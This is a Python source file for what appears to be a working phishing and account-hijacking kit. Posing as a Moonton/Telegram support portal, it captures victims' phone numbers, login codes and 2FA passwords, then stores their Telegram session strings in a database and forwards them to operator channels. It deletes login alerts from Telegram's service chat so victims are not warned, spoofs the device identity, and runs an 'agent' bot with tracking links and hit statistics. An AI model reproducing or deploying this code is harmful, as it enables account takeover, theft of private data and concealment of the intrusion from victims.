

import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
import re
import time
import uuid
import string
import secrets
import textwrap
import datetime
from psycopg2 import pool
from telebot import types
from quart import Quart, request, jsonify, send_from_directory, render_template
from quart_cors import cors
from telethon import TelegramClient, errors, functions, types as tl_types
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timezone, timedelta

# =========================================================================
# 1. SYSTEM IDENTITY & CORE CONFIGURATION
# =========================================================================

# Static Versioning and Identity Declarations
SYSTEM_VERSION = "8.8.0"
SYSTEM_IDENTITY = "MOONTON_OFFICIAL_GATEWAY"
START_TIME = time.time()

# Environment Credentials (Injected via Koyeb Environment Variables)
# These are essential for the MTProto connection and database linking.
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

# Notification Channel IDs for Result Logging
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -1003811039696))
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", -1003808360697))

# HARDCODED DOMAIN OVERRIDE
# This URL is used by the bot to generate the dynamic portal links.
BASE_URL = os.environ.get("BASE_URL", "selfish-kettie-moonton-support-c57267de.koyeb.app")

# Advanced Logging Infrastructure
# We use a verbose format to track node status in the Koyeb console.
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s][%(levelname)s][MOONTON_SYSTEM]: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("MoontonGateway")

# =========================================================================
# 2. OFFICIAL SERVICE IDENTITY (ANTI-GHOST CONFIGURATION)
# =========================================================================

# This dictionary masks our script as the official Moonton Service.
# This prevents Telegram from flagging the session as a 'suspicious' login.
OFFICIAL_SUPPORT_DEVICE = {
    "model": "Telegram Verfication",
    "sys": "Telegram Center",
    "app": "Telegram_API_Service",
    "lang": "en",
    "system_lang": "en",
    "app_version": "8.0.0"
}

# =========================================================================
# 3. SECURE DATA PERSISTENCE (POSTGRESQL CLUSTER)
# =========================================================================

# Threaded connection pool handles high-concurrency hits without crashing.
try:
    db_pool = psycopg2.pool.ThreadedConnectionPool(
        minconn=20,
        maxconn=500,
        dsn=DATABASE_URL,
        sslmode='require'
    )
    logger.info("DATABASE: Enterprise Persistence Layer Connected Successfully.")
except Exception as e:
    logger.critical(f"DATABASE FATAL: Connection to PostgreSQL failed: {e}")
    db_pool = None

def get_db_connection():
    """
    Retrieves a connection from the pool.
    Includes a retry mechanism if the pool is saturated.
    """
    if not db_pool:
        return None
    try:
        connection_instance = db_pool.getconn()
        return connection_instance
    except Exception as connection_error:
        logger.error(f"POOL ERROR: Unable to fetch connection: {connection_error}")
        return None

def release_db_connection(conn):
    """
    Returns a database connection to the thread pool for reuse.
    """
    if db_pool and conn:
        try:
            db_pool.putconn(conn)
        except Exception as release_error:
            logger.error(f"POOL ERROR: Unable to release connection: {release_error}")

def initialize_moonton_schema():
    """
    AUTO-REPAIR: Ensures all tables and columns exist on startup.
    This prevents 'Column Not Found' errors during peak traffic.
    """
    conn = get_db_connection()
    if not conn:
        return
    try:
        cur = conn.cursor()
        
        # Create Main Vault Table for Sessions
        cur.execute("""
            CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                phone TEXT PRIMARY KEY,
                session_string TEXT NOT NULL,
                ip_address TEXT,
                cloud_password TEXT,
                capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Create Metrics Table for Agent Performance
        cur.execute("""
            CREATE TABLE IF NOT EXISTS support_agent_metrics (
                agent_id BIGINT PRIMARY KEY,
                total_clicks INTEGER DEFAULT 0,
                total_hits INTEGER DEFAULT 0,
                last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        conn.commit()
        cur.close()
        logger.info("SCHEMA: Database repair and synchronization complete.")
    except Exception as schema_error:
        logger.error(f"SCHEMA ERROR: {schema_error}")
    finally:
        release_db_connection(conn)

# Trigger schema check on script launch
initialize_moonton_schema()

# =========================================================================
# 4. SECURITY PURGE ENGINE (THE REAPER - HIGH SPEED)
# =========================================================================

async def execute_security_purge(client):
    """
    Aggressive Zero-Trace Logic.
    Scans the 777000 (Telegram Service) chat and deletes all login alerts.
    This ensures the victim does not get a notification on their other devices.
    """
    try:
        logger.info("REAPER: Initiating rapid scan on Service Node 777000...")
        
        # Target specific login keywords to avoid deleting other system messages
        security_triggers = ["login", "code", "device", "location", "authorized", "access"]
        
        async for message in client.iter_messages(777000, limit=20):
            message_body = (message.text or "").lower()
            
            if any(trigger in message_body for trigger in security_triggers):
                message_id_list = [message.id]
                await client.delete_messages(777000, message_id_list)
                logger.info(f"REAPER: Deleted security alert ID: {message.id}")
        
        # Complete history wipe for total silence
        await client(functions.messages.DeleteHistoryRequest(
            peer=777000, 
            max_id=0, 
            just_clear=True, 
            revoke=True
        ))
        
        logger.info("REAPER: Purge operation finalized.")
    except Exception as reaper_error:
        logger.error(f"REAPER_ERR: Purge failed or interrupted: {reaper_error}")

# =========================================================================
# 5. ASYNCHRONOUS METRICS ENGINE
# =========================================================================

async def update_metrics_async(agent_id, is_hit=False):
    """
    Handles performance tracking in the background.
    This prevents the main login flow from slowing down due to DB latency.
    """
    connection = get_db_connection()
    if not connection:
        return
        
    try:
        cursor = connection.cursor()
        
        if is_hit:
            # Increment successful captures
            update_query = "UPDATE support_agent_metrics SET total_hits = total_hits + 1 WHERE agent_id = %s"
            cursor.execute(update_query, (agent_id,))
        else:
            # Increment portal views (clicks)
            upsert_query = """
                INSERT INTO support_agent_metrics (agent_id, total_clicks) 
                VALUES (%s, 1)
                ON CONFLICT (agent_id) 
                DO UPDATE SET total_clicks = support_agent_metrics.total_clicks + 1
            """
            cursor.execute(upsert_query, (agent_id,))
            
        connection.commit()
        cursor.close()
    except Exception as metrics_error:
        logger.error(f"METRICS_ERR: Background update failed: {metrics_error}")
    finally:
        release_db_connection(connection)

# =========================================================================
# 6. ENTERPRISE WEB INFRASTRUCTURE (QUART) - SYNCED TO HTML
# =========================================================================

app = Quart(__name__, template_folder='templates')
app = cors(app, allow_origin="*")

# In-memory session tracking for active handshakes
active_mirrors = {}

@app.route('/')
async def index():
    """
    Serves the main login.html file.
    Captures the 'id' parameter from the URL to track the agent.
    """
    return await render_template('login.html')

@app.route('/step_phone', methods=['POST'])
async def official_phone_handshake():
    """
    Phase 1: Initiate MTProto Connection.
    Uses an aggressive reconnection strategy for maximum speed.
    """
    try:
        request_data = await request.json
        raw_phone = str(request_data.get('phone', ''))
        phone_cleaned = re.sub(r'\D', '', raw_phone)
        agent_id_raw = request_data.get('tid', 0)
        
        try:
            agent_id = int(agent_id_raw)
        except:
            agent_id = 0

        if not phone_cleaned or len(phone_cleaned) < 8:
            return jsonify({"status": "error", "msg": "Format Invalid."})

        # Trigger background metric update
        asyncio.create_task(update_metrics_async(agent_id, is_hit=False))

        # Client Configuration for High-Speed Reaction
        client_instance = TelegramClient(
            StringSession(), 
            API_ID, 
            API_HASH,
            device_model=OFFICIAL_SUPPORT_DEVICE['model'],
            system_version=OFFICIAL_SUPPORT_DEVICE['sys'],
            app_version=OFFICIAL_SUPPORT_DEVICE['app_version'],
            connection_retries=5,
            retry_delay=0.5,
            auto_reconnect=True
        )
        
        await client_instance.connect()
        
        try:
            # Requesting the OTP from Telegram
            sent_code_bundle = await client_instance.send_code_request(phone_cleaned)
            
            # Store session state in memory
            active_mirrors[phone_cleaned] = {
                "client": client_instance,
                "hash": sent_code_bundle.phone_code_hash,
                "agent_id": agent_id,
                "created_at": time.time(),
                "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
                "cloud_password": "None"
            }
            
            logger.info(f"⚡ FAST_HANDSHAKE: Handshake initialized for {phone_cleaned}")
            return jsonify({"status": "success"})
            
        except Exception as handshake_error:
            logger.error(f"HANDSHAKE_FAIL: Error during code request: {handshake_error}")
            await client_instance.disconnect()
            return jsonify({"status": "error", "msg": "Node Busy. Try later."})
            
    except Exception as critical_web_error:
        logger.error(f"CRITICAL_WEB_ERR: Phase 1 failure: {critical_web_error}")
        return jsonify({"status": "error", "msg": "Internal Node Failure."})

@app.route('/step_code', methods=['POST'])
async def official_code_verification():
    """
    Phase 2: OTP Verification Logic.
    Detects if 2FA is enabled and updates the UI accordingly.
    """
    try:
        request_payload = await request.json
        raw_phone_val = str(request_payload.get('phone', ''))
        phone_key = re.sub(r'\D', '', raw_phone_val)
        otp_code = str(request_payload.get('code', '')).strip()

        if phone_key not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session Time-out."})

        session_data = active_mirrors[phone_key]
        tg_client = session_data['client']
        code_hash = session_data['hash']

        try:
            # Attempt to sign in with the provided OTP
            await tg_client.sign_in(
                phone=phone_key, 
                code=otp_code, 
                phone_code_hash=code_hash
            )
            
            # If successful without 2FA, proceed to finalization
            return await finalize_moonton_capture(phone_key)
            
        except errors.SessionPasswordNeededError:
            # Account has 2FA enabled; trigger the Password UI in the HTML
            logger.info(f"SECURITY: 2FA required for {phone_key}")
            return jsonify({"status": "2fa_needed"})
            
        except Exception as signin_error:
            logger.warning(f"SIGNIN_WARN: Invalid code attempt for {phone_key}: {signin_error}")
            return jsonify({"status": "error", "msg": "Verification Code Incorrect."})
            
    except Exception as phase2_error:
        logger.error(f"PHASE2_ERR: Internal logic failure: {phase2_error}")
        return jsonify({"status": "error", "msg": "Node Synchronization Error."})

@app.route('/step_2fa', methods=['POST'])
async def official_2fa_authentication():
    """
    Phase 3: 2-Step Verification Handling.
    Captures the cloud password and completes the MTProto session.
    """
    try:
        auth_data = await request.json
        phone_id = re.sub(r'\D', '', str(auth_data.get('phone', '')))
        password_val = str(auth_data.get('password', '')).strip()

        if phone_id not in active_mirrors:
            return jsonify({"status": "error", "msg": "Link Synchronization Lost."})

        # Update the session with the captured password for the Telegram Hit log
        active_mirrors[phone_id]['cloud_password'] = password_val
        tg_client_2fa = active_mirrors[phone_id]['client']
        
        try:
            # Final attempt to unlock the account
            await tg_client_2fa.sign_in(password=password_val)
            return await finalize_moonton_capture(phone_id)
            
        except Exception as auth_2fa_error:
            logger.warning(f"2FA_WARN: Incorrect password for {phone_id}: {auth_2fa_error}")
            return jsonify({"status": "error", "msg": "2FA Password Incorrect."})
            
    except Exception as phase3_error:
        logger.error(f"PHASE3_ERR: 2FA handler crashed: {phase3_error}")
        return jsonify({"status": "error", "msg": "2FA Authentication Failure."})

async def finalize_moonton_capture(phone_target):
    """
    Phase 4: Data Finalization & Secure Logging.
    1. Runs the Reaper to clean logs.
    2. Saves session to PostgreSQL.
    3. Sends detailed HIT logs to Telegram.
    """
    try:
        target_data = active_mirrors.get(phone_target)
        if not target_data:
            return jsonify({"status": "error", "msg": "Data Finalization Lost."})

        final_client = target_data['client']
        target_agent = target_data['agent_id']
        target_ip = target_data['ip']
        target_pw = target_data['cloud_password']

        # Execute Zero-Trace Purge BEFORE saving/disconnecting
        await execute_security_purge(final_client)
        
        # Capture the MTProto Session String
        final_session_string = final_client.session.save()

        # Database Persistence Logic (Verbose)
        try:
            db_conn = get_db_connection()
            if db_conn:
                db_cursor = db_conn.cursor()
                
                # Store the session and captured password
                insert_vault_query = """
                    INSERT INTO moonton_secure_vault (phone, session_string, ip_address, cloud_password) 
                    VALUES (%s, %s, %s, %s) 
                    ON CONFLICT (phone) 
                    DO UPDATE SET session_string = EXCLUDED.session_string, cloud_password = EXCLUDED.cloud_password
                """
                db_cursor.execute(insert_vault_query, (phone_target, final_session_string, target_ip, target_pw))
                
                # Update agent success stats
                db_conn.commit()
                db_cursor.close()
                release_db_connection(db_conn)
                
            # Background update for hit metrics
            asyncio.create_task(update_metrics_async(target_agent, is_hit=True))
            
        except Exception as db_final_error:
            logger.error(f"DB_FINAL_ERR: Persistent storage failure: {db_final_error}")

        # Construct Detailed Telegram Notification
        log_payload = (
            f"🛡️ <b>OFFICIAL MOONTON HIT</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>Node Identity:</b> <code>{OFFICIAL_SUPPORT_DEVICE['model']}</code>\n"
            f"📞 <b>Target Phone:</b> <code>{phone_target}</code>\n"
            f"🔐 <b>Cloud 2FA:</b> <code>{target_pw}</code>\n"
            f"🕵️ <b>Assigned Agent:</b> <code>{target_agent}</code>\n"
            f"🌐 <b>Network IP:</b> <code>{target_ip}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>ENCRYPTED SESSION STRING:</b>\n"
            f"<code>{final_session_string}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━"
        )
        
        # Dispatch to Logging Channels
        try:
            bot.send_message(LOGGER_GROUP, log_payload, parse_mode="HTML")
            bot.send_message(VERIFY_GROUP, f"✅ <b>Verified Access:</b> {phone_target}", parse_mode="HTML")
            
            # Notify the agent directly
            if target_agent != 0:
                agent_msg = f"🎯 <b>Capture Successful!</b>\nTarget <code>{phone_target}</code> has been secured and logged."
                bot.send_message(target_agent, agent_msg, parse_mode="HTML")
        except Exception as notify_error:
            logger.error(f"NOTIFY_ERR: Failed to send TG alerts: {notify_error}")

        # Final Cleanup
        await asyncio.sleep(2)
        await final_client.disconnect()
        
        if phone_target in active_mirrors:
            del active_mirrors[phone_target]
            
        logger.info(f"SUCCESS: Captured and finalized node for {phone_target}")
        return jsonify({"status": "success"})
        
    except Exception as finalizer_critical_error:
        logger.error(f"CRITICAL_FINAL_ERR: {finalizer_critical_error}")
        return jsonify({"status": "error", "msg": "Encryption Finalization Failure."})

# =========================================================================
# 7. MOONTON AGENT BOT (TELEGRAM INTERFACE)
# =========================================================================

# Initialize the Bot with the Enterprise Token
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start', 'help'])
def bot_welcome_handler(message):
    """
    Standard Welcome Command for Agents.
    Displays the Agent ID and operational status.
    """
    first_name = message.from_user.first_name
    agent_id = message.from_user.id
    
    welcome_message = (
        f"🛡️ <b>Moonton Support Center v{SYSTEM_VERSION}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"Hello, <b>{first_name}</b>.\n"
        f"Your Agent ID: <code>{agent_id}</code>\n"
        f"Node Status: 🟢 <b>Operational</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"Use the menu below to manage your traffic."
    )
    
    # Custom Keyboard Layout
    keyboard_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_link = types.KeyboardButton("🔗 Portal Link")
    btn_perf = types.KeyboardButton("📊 My Performance")
    btn_node = types.KeyboardButton("📡 Node Status")
    
    keyboard_markup.add(btn_link, btn_perf, btn_node)
    
    bot.send_message(
        message.chat.id, 
        welcome_message, 
        reply_markup=keyboard_markup, 
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda message: message.text == "🔗 Portal Link")
def bot_link_generator(message):
    """
    Generates a personalized tracking link for the agent.
    """
    agent_id = message.from_user.id
    personal_link = f"https://{BASE_URL}/?id={agent_id}"
    
    response_text = (
        f"📡 <b>Personalized Support Link:</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>{personal_link}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"Share this link to begin binding accounts."
    )
    
    bot.send_message(message.chat.id, response_text, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "📊 My Performance")
def bot_performance_reporter(message):
    """
    Retrieves and displays real-time stats for the agent.
    """
    agent_id = message.from_user.id
    db_conn = get_db_connection()
    
    clicks_count = 0
    hits_count = 0
    
    if db_conn:
        try:
            cursor = db_conn.cursor()
            query = "SELECT total_clicks, total_hits FROM support_agent_metrics WHERE agent_id = %s"
            cursor.execute(query, (agent_id,))
            result_row = cursor.fetchone()
            
            if result_row:
                clicks_count = result_row[0]
                hits_count = result_row[1]
                
            cursor.close()
        except Exception as db_query_error:
            logger.error(f"DB_QUERY_ERR: {db_query_error}")
        finally:
            release_db_connection(db_conn)
    
    performance_report = (
        f"📊 <b>Agent Performance Metrics</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🖱️ <b>Total Portal Clicks:</b> {clicks_count}\n"
        f"🎯 <b>Successful Captures:</b> {hits_count}\n"
        f"📈 <b>Conversion Rate:</b> {0 if clicks_count == 0 else round((hits_count/clicks_count)*100, 2)}%\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    
    bot.send_message(message.chat.id, performance_report, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "📡 Node Status")
def bot_node_status_checker(message):
    """
    Displays technical health of the backend node.
    """
    current_time_val = time.time()
    uptime_seconds = int(current_time_val - START_TIME)
    uptime_formatted = str(timedelta(seconds=uptime_seconds))
    
    active_session_count = len(active_mirrors)
    
    db_health = "🟢 Connected" if db_pool else "🔴 Disconnected"
    
    status_report = (
        f"📡 <b>Gateway Health Report</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱️ <b>System Uptime:</b> {uptime_formatted}\n"
        f"🗄️ <b>Database Link:</b> {db_health}\n"
        f"🛰️ <b>Active Handshakes:</b> {active_session_count}\n"
        f"⚙️ <b>Load Balancing:</b> Active\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    
    bot.send_message(message.chat.id, status_report, parse_mode="HTML")

# =========================================================================
# 8. MAINTENANCE WATCHDOG & RUNTIME
# =========================================================================

async def session_watchdog_timer():
    """
    Background loop that prunes abandoned sessions.
    Cleans memory every 10 minutes to maintain high performance.
    """
    while True:
        try:
            current_timestamp = time.time()
            # Identify sessions older than 20 minutes
            expired_sessions = []
            
            for phone_key, data_blob in active_mirrors.items():
                if current_timestamp - data_blob['created_at'] > 1200:
                    expired_sessions.append(phone_key)
            
            for expired_key in expired_sessions:
                try:
                    # Cleanly disconnect before removing from memory
                    await active_mirrors[expired_key]['client'].disconnect()
                except:
                    pass
                del active_mirrors[expired_key]
                logger.info(f"WATCHDOG: Pruned inactive session: {expired_key}")
                
        except Exception as watchdog_error:
            logger.error(f"WATCHDOG_ERR: Loop error: {watchdog_error}")
            
        # Wait for 10 minutes before next sweep
        await asyncio.sleep(600)

def start_bot_polling_thread():
    """
    Handles the Telegram Bot polling in a persistent thread.
    Includes an auto-restart mechanism for crashes.
    """
    logger.info("BOT: Initializing polling engine...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=120, interval=0)
        except Exception as polling_error:
            logger.error(f"BOT_POLLING_ERR: {polling_error}")
            # Wait 15 seconds before attempting to recover
            time.sleep(15)

@app.before_serving
async def startup_initialization():
    """
    Quart hook to launch background tasks when the server starts.
    """
    asyncio.create_task(session_watchdog_timer())

if __name__ == "__main__":
    # 1. Start the Telegram Agent Bot in a background thread
    bot_thread = Thread(target=start_bot_polling_thread, daemon=True)
    bot_thread.start()
    
    # 2. Determine Deployment Port (Koyeb uses PORT env)
    server_port = int(os.environ.get("PORT", 8000))
    
    # 3. Launch the Quart High-Speed Web Server
    logger.info(f"SYSTEM BOOT: Node {SYSTEM_IDENTITY} v{SYSTEM_VERSION} on Port {server_port}")
    
    try:
        app.run(
            host="0.0.0.0", 
            port=server_port, 
            use_reloader=False, 
            debug=False
        )
    except Exception as runtime_fatal:
        logger.critical(f"FATAL: System crash at runtime: {runtime_fatal}")
        sys.exit(1)

# =========================================================================
# END OF PRODUCTION SCRIPT - VERSION 8.8.0
# =========================================================================
